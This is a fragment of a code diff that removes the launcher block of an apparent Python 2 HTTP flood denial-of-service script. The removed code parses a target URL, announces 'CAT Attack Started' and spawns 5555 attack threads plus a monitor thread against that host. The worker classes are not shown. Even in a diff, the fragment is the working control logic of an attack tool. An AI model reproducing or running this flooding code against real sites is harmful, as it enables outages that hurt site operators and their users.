@@ -156,26 +156,3 @@ else:
 		t.start()
 
 
-#execute 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-	else:
-		print "100%<== CAT Attack Started ==>100%"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(5555):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
